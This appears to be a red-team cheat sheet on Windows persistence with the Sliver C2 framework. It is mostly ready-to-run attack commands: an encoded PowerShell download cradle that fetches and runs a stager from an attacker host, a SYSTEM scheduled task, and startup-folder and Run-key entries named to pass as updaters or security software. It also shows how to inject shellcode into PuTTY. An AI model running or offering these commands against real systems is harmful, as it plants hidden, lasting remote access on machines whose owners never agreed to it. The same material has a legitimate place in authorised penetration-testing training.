NOTE: This can be pre OR post- privilege escalation. Good to do both.

The examples below will be referencing a Stager. If you already have a beacon on the box, you can just point them to that!

> **Setup:** `sharpersist` and `hashdump` need the armory package installed first — `sliver> armory install <pkg>
## Scheduled Task 

Make Windows run a PowerShell download-cradle on an interval. `-enc` wants the command base64'd in **UTF-16LE**, so encode first, then create the task.

```bash
# Encode the cradle (if we are using a STAGER)
echo -en "iex(new-object net.webclient).downloadString('http://<LHOST>:8088/stager.txt')" | iconv -t UTF-16LE | base64 -w 0

# Create scheduled task
sliver> execute powershell 'schtasks /create /sc minute /mo 1 /tn SecurityUpdater /tr "powershell.exe -enc <BASE64>" /ru SYSTEM'
	# NOTE: If we have a beacon on there already, we can just do /tr "C:\path\to\beacon.exe"
```

Fires every 1 min, runs as SYSTEM. Named `SecurityUpdater` to blend in.

| Flag | Meaning |
|------|---------|
| `/sc minute /mo 1` | schedule type + interval (every 1 min) |
| `/tn` | task name |
| `/tr` | task to run |
| `/ru` | user context (SYSTEM) |
## Startup Folder

Anything in a user's Startup folder runs at logon. Drop a `.lnk` via SharPersist.

```bash
sliver> sharpersist -- -t startupfolder -c "powershell.exe" -a "-nop -w hidden iex(new-object net.webclient).downloadstring('http://<LHOST>:8088/stager.txt')" -f "Edge Updater" -m add
```

- Path: `C:\Users\<U>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
- Disguised as `Edge Updater.lnk`

```bash
# ── verify ──
sliver> ls "C:\Users\<U>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
```

## Run / RunOnce Registry 

Same logon-trigger idea, registry mechanism. Writable key depends on privilege. These keys will get spotted ASAP by anyone competent.
	HKCU\Software\Microsoft\Windows\CurrentVersion\Run
	HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
	HKLM\Software\Microsoft\Windows\CurrentVersion\Run
	HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

```bash
# ── add ──
sliver> sharpersist -- -t reg -c "powershell.exe" -a "-nop -w hidden iex(new-object net.webclient).downloadstring('http://<LHOST>:8088/staged.txt')" -k "hklmrun" -v "AdvancedProtection" -m add
```

```bash
# ── list ──
sliver> sharpersist -- -t reg -k "hklmrun" -m list
```

Disguised as `AdvancedProtection`.

---

## Backdoor a Binary 

Inject shellcode into a legit app (e.g. PuTTY). When the user runs it, you get a beacon.

```bash
sliver> profiles new --format shellcode --http <LHOST>:9002 persistence-shellcode
sliver> http -L <LHOST> -l 9002
sliver> backdoor --profile persistence-shellcode "C:\Program Files\PuTTY\putty.exe"
```

**Catch:** the app usually won't open anymore (you broke it) — you still get the beacon, but the user notices the app died. Noisy.

> Source: `rpc-backdoor.go` / `backdoor.go` — validates Windows target, injects shellcode from the profile into the original binary, uploads the tampered copy over the original.